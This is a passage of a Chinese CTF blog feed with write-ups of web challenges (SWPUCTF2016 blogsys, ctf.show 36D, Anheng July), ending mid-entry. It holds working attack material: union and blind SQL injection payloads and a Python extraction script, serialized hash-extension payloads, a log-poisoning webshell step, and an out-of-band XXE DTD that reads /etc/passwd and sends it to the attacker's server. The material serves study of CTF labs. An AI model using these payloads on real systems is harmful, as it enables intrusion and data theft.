class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">            @mysql_conn();</span><br><span class="line">            $sql1 = <span class="string">"select * from msg where userid= $id order by id"</span>;</span><br><span class="line">            $query = mysql_query($sql1);</span><br><span class="line">            $result1 = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">while</span> ($temp = mysql_fetch_assoc($query)) &#123;</span><br><span class="line">                $result1[] = $temp;</span><br><span class="line">            &#125;</span><br><span class="line">            mysql_close();</span><br><span class="line">            <span class="keyword">foreach</span> ($result1 <span class="keyword">as</span> $x =&gt; $o) &#123;</span><br><span class="line">                <span class="keyword">echo</span> display($o[<span class="string">'msg'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到查询时，$id未被引号包裹，addslashes等于没用，再看api.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; unserialize(base64_decode($api));</span><br><span class="line">$a-&gt;do_method();</span><br></pre></td></tr></table></figure><p>$api参数未被初始化，也就是说是可控的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//api.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $username = addslashes(<span class="keyword">$this</span>-&gt;name);<span class="comment">//进入数据库的数据进行转义</span></span><br><span class="line">       @mysql_conn();</span><br><span class="line">       $sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">       $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">       mysql_close();</span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>($result)) &#123;</span><br><span class="line">           <span class="comment">//利用 salt 验证是否为该用户</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;check === md5($result[<span class="string">'salt'</span>] . <span class="keyword">$this</span>-&gt;data . $username)) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">'(=-=)!!'</span>;</span><br><span class="line">               <span class="keyword">if</span> ($result[<span class="string">'role'</span>] == <span class="number">1</span>) &#123;<span class="comment">//检查是否为admin用户</span></span><br><span class="line">                   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以看到要通过验证，需要拿到md5的加盐值，还要判断是否为admin用户，既然包含了common.php，也就是说存在变量覆盖漏洞，那么$a的属性值可控</p><p><code>$result[&#39;salt&#39;]</code>随机生成，找一下怎么才能拿到这个值</p><p>在forget.php文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($result)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'salt'</span>]) &#123;</span><br><span class="line">        $check = base64_encode(md5($result[<span class="string">'salt'</span>]));</span><br><span class="line">        $name = $result[<span class="string">'name'</span>];</span><br><span class="line">        header(<span class="string">"Location:/repass.php?username=$name&amp;check=$check&amp;mibao=$mibao&amp;pass=$pass"</span>);</span><br></pre></td></tr></table></figure><p>这里更改密码时会发生页面跳转，不管成功与否都会爆出路径和参数，其中就包括了base64加密之后的</p><p><code>$result[&#39;salt&#39;]</code></p><p>下面就是哈希拓展攻击，工具在这<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">https://github.com/JoyChou93/md5-extension-attack</a></p><p>思路清晰了，忘记密码进行修改时通过尝试更改admin账户，页面跳转拿到<code>$result[&#39;salt&#39;]</code>，在构造序列化数据，再传值给api.php中可控的$api参数，$id可控，再进行数据库数据的查询拿到flag</p><img src="/2020/08/04/SWPUCTF2016-Web-blogsys/1.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">var</span> $check= <span class="string">"6122c04e8a1f3529d556199960ef2556"</span>;</span><br><span class="line">    <span class="keyword">var</span> $data = <span class="string">"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">var</span> $method=<span class="string">"del_user"</span>;   <span class="comment">//要调用的函数</span></span><br><span class="line">    <span class="keyword">var</span> $userid=<span class="string">"2"</span>;  <span class="comment">//要删除的用户</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> admin();</span><br><span class="line">$api = base64_encode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> $api;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span></span><br></pre></td></tr></table></figure><p>这里要删除的用户通过查看登录用户cookie解密之后得到的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@$login==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">@mysql_conn();</span><br><span class="line">$sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">mysql_close();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($result))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'passwd'</span>] == md5($password))</span><br><span class="line">&#123;</span><br><span class="line">$user_cookie = <span class="string">''</span>;</span><br><span class="line">$user_cookie .= $result[<span class="string">'userid'</span>];</span><br><span class="line">$user_cookie .= $result[<span class="string">'name'</span>];</span><br><span class="line">$user_cookie .= $result[<span class="string">'salt'</span>];</span><br><span class="line">$cookies = base64_encode($user_cookie);</span><br><span class="line"><span class="comment">//$cookies = $user_cookie;</span></span><br><span class="line">setcookie(<span class="string">"user"</span>,$cookies,time()+<span class="number">60</span>,<span class="string">'/web/'</span>);</span><br><span class="line">$_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = $username;</span><br><span class="line">header(<span class="string">'Location:/web/riji.php'</span>);</span><br></pre></td></tr></table></figure><p>最后就是传参，再开个窗口或者换个浏览器</p><img src="/2020/08/04/SWPUCTF2016-Web-blogsys/2.png" class=""><p>这时候会发现之前登录的账号还保持登录的状态，直接查flag(字段值逐个猜测，为3)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()<span class="comment">#flag,msg,user</span></span><br><span class="line">?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x666c6167<span class="comment">#flag</span></span><br><span class="line">?id=-1%20union%20select%201,2,flag%20from%20flag</span><br></pre></td></tr></table></figure><img src="/2020/08/04/SWPUCTF2016-Web-blogsys/3.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> SWPU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>36D-web-ak-challenge</title>
      <link href="/2020/07/31/36D-web-ak-challenge/"/>
      <url>/2020/07/31/36D-web-ak-challenge/</url>
      
        <content type="html"><![CDATA[<p>昨天就看了签到题比较匆忙，没猜着文件名就没做了，今天好好复现<a id="more"></a></p><h2 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>nginx日志文件路径</li><li>UA字段插入一句话木马</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/php/i'</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>开始以为考点在preg_match()函数的绕过，尝试了数组和换行符进行绕过php过滤，先入为主了，以为过滤了php后缀flag文件就是flag.php，没有考虑到flag.txt,还在那尝试了半天的路径穿越</p><p>知道了文件名直接猜测在根目录下面</p><img src="/2020/07/31/36D-web-ak-challenge/1.png" class=""><p>正解应该不是这样做的，先看一下nginx的日志文件<code>?file=/var/log/nginx/access.log</code></p><img src="/2020/07/31/36D-web-ak-challenge/2.png" class=""><p>看到了包含UA字段，尝试能不能在UA字段插入一句话🐎，抓包添加一下放包</p><img src="/2020/07/31/36D-web-ak-challenge/3.png" class=""><p>可以看到根目录下的flag.txt文件，再读取</p><p>还有一种解法使用伪协议data://，但是这题行不通，allow_url_include是off(附上伪协议文章，很详细<a href="https://blog.csdn.net/nzjdsds/article/details/82461043" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/82461043</a>)</p><h2 id="web1-观字"><a href="#web1-观字" class="headerlink" title="web1_观字"></a>web1_观字</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>curl命令</li><li>curl命令。能够替换.</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题送源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#flag in http://192.168.7.68/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    $protocol = substr($url, <span class="number">0</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>($protocol!=<span class="string">'http://'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'仅限http协议访问'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\'|\"|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'仅限域名地址访问'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">'curl '</span>.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接给了flag的位置，问题是怎么绕过过滤让curl执行读取文件信息</p><p>这里进制转换不行，过滤了0，转换为十进制为3232237380</p><p>这里就要用到上面那的知识点用(。)替代(.)</p><img src="/2020/07/31/36D-web-ak-challenge/4.png" class=""><h2 id="web2-观星"><a href="#web2-观星" class="headerlink" title="web2_观星"></a>web2_观星</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>substr()逗号被过滤时用from x1 for x2替代</li><li>if替代，case when then else end</li></ul><h3 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题，能选择三个链接，跟id有关，首先想到的是SQL注入</p><p>测试一下，发现空格、逗号、ascii、like、=等被过滤了</p><p><code>substr(database() from 1 for 1 )代替substr(database(),1,1)</code></p><p><code>case when代替if</code></p><p><code>ord代替ascii</code></p><p><code>regexp代替like、=</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://ac6a84ba-b399-4b05-8a0d-a103b394dfc9.chall.ctf.show/index.php?id=1^"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload1 = <span class="string">"case(ord(substr(database()from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#web1</span></span><br><span class="line">        payload2 = <span class="string">"case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#flag,page,user</span></span><br><span class="line">        payload3 = <span class="string">"case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp(0x666c6167))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#FLAG_COLUMN,flag</span></span><br><span class="line">        payload4 = <span class="string">"case(ord(substr((select(group_concat(flag))from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)</span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(url+payload3)</span></span><br><span class="line">        r = requests.get(url+payload4)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"I asked nothing"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>本来想用二分法，但是这题好像不太合适，常规方法速度也挺快的，就用常规的盲注方法好了</p><h2 id="web3-观图"><a href="#web3-观图" class="headerlink" title="web3_观图"></a>web3_观图</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>openssl_decrypt函数加密</li><li>rand()函数最大值</li><li>暴力破解</li></ul><h3 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题是一张GIF图片，查看源码发现提示</p><img src="/2020/07/31/36D-web-ak-challenge/5.png" class=""><p>直接访问showImage.php，拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$key = substr(md5('ctfshow'.rand()),3,8);</span></span><br><span class="line"><span class="comment">//flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'image'</span>]))&#123;</span><br><span class="line">    $image=$_GET[<span class="string">'image'</span>];</span><br><span class="line">    $str = openssl_decrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($str))&#123;</span><br><span class="line">        header(<span class="string">'content-type:image/gif'</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源码中就可以看出要爆破出key的值，查一下opessl_decrypt函数的用法，尝试爆破</p><p>源码中只要我们能够得到解密后的文件名并且存在，就能够包含该文件</p><p>先来看一下rand()函数的最大值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(getrandmax());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="number">32767</span></span><br></pre></td></tr></table></figure><p>下面就碰撞出key的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">32768</span>;$i++)&#123;</span><br><span class="line">    $key = substr(md5(<span class="string">'ctfshow'</span>.$i),<span class="number">3</span>,<span class="number">8</span>);</span><br><span class="line">    $image=<span class="string">"Z6Ilu83MIDw="</span>;</span><br><span class="line">    $str = openssl_decrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line">    <span class="keyword">if</span>(strpos($str,<span class="string">"gif"</span>) <span class="keyword">or</span> strpos($str,<span class="string">"jpg"</span>) <span class="keyword">or</span> strpos($str,<span class="string">"png"</span>))&#123;</span><br><span class="line">        <span class="keyword">print</span>($str.<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">print</span>($i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">327671.</span>jpg <span class="number">27347</span></span><br></pre></td></tr></table></figure><p>文件格式不外乎gif\png\jpg</p><p>只要解密后能够匹配到就算成功了</p><p>得到$i的值为27347</p><p>下面就是解密了，由于浏览器会进行一次url解码，这里要进行一下编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$rand=<span class="number">27347</span>;</span><br><span class="line">$key = substr(md5(<span class="string">'ctfshow'</span>.$rand),<span class="number">3</span>,<span class="number">8</span>);</span><br><span class="line">$image=<span class="string">"config.php"</span>;</span><br><span class="line">$str = openssl_encrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($str);</span><br><span class="line"><span class="number">27347</span>N6bf8Bd8jm0SpmTZGl0isw==&lt;br /&gt;N6bf8Bd8jm0SpmTZGl0isw%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>访问</p><img src="/2020/07/31/36D-web-ak-challenge/6.png" class=""><p>一张打不开的图片，下载下来保存，notepad++打开即可</p><img src="/2020/07/31/36D-web-ak-challenge/7.png" class=""><h2 id="web4-观心"><a href="#web4-观心" class="headerlink" title="web4_观心"></a>web4_观心</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ul><li>xxe的DTD实体</li></ul><h3 id="解题步骤-4"><a href="#解题步骤-4" class="headerlink" title="解题步骤"></a>解题步骤</h3><img src="/2020/07/31/36D-web-ak-challenge/8.png" class=""><p>占卜时可以看到向api.php，POST传参api和city</p><p>可以看到文件格式是xml</p><p>应该是Blind_OOB_XXE ，这里有篇文章<a href="https://blog.csdn.net/weixin_39194641/article/details/102251374" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39194641/article/details/102251374</a></p><p>在自己的vps上起一个xml和dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/test.dtd"</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote;%int;%send; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>bee<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY xxe SYSTEM &#39;ip&#x2F;pass&#x3D;%p1;&#39;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure><p>post传参访问自己的vps网页就行</p><img src="/2020/07/31/36D-web-ak-challenge/9.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DSAJuly</title>
      <link href="/2020/07/31/DSAJuly/"/>
      <url>/2020/07/31/DSAJuly/</url>
      
        <content type="html"><![CDATA[<p>安恒月赛，就做出了一个WEB，赛后复现，学习SQL无列名注入，以及等价替换的数据库<a id="more"></a></p><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>bypassinfomation_schema(sys.schema_table_statistics_with_buffer/sys.x$schema_table_statistics_with_buffer/mysql.innodb_table_stats)</li><li>sys.schema_tables_with_full_table_scans</li><li>无列名注入</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>打开题目要传入id</p><p>尝试联合查询，返回了WAF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|`/i"</span>, $id);</span><br></pre></td></tr></table></figure><p>看到被过滤的关键词，information_schema不能用了，然后当时想到了能替换的库，但是不知道怎么找</p><p>这里stat被过滤说明下面的库也都不能用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sys.schema_table_statistics_with_buffer&#x2F;sys.x$schema_table_statistics_with_buffer&#x2F;mysql.innodb_table_stats)</span><br></pre></td></tr></table></figure><p>赛后看wp还有一个库sys.schema_tables_with_full_table_scans</p><p>查一下表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=0'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(object_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_tables_with_full_table_scans%<span class="number">23</span></span><br><span class="line"><span class="comment">#users,flllaaaggg,sys_config</span></span><br></pre></td></tr></table></figure><img src="/2020/07/31/DSAJuly/1.png" class=""><p>下面就是要进行无列名注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>a<span class="number">.2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flllaaaggg)a<span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><img src="/2020/07/31/DSAJuly/2.png" class=""><h2 id="Ezfileincude"><a href="#Ezfileincude" class="headerlink" title="Ezfileincude"></a>Ezfileincude</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>Unix时间戳</li><li>文件包含</li><li>目录穿越</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题得到一张图片</p><img src="/2020/07/31/DSAJuly/3.png" class=""><p>查看源代码，发现可以点击的地址</p><img src="/2020/07/31/DSAJuly/4.png" 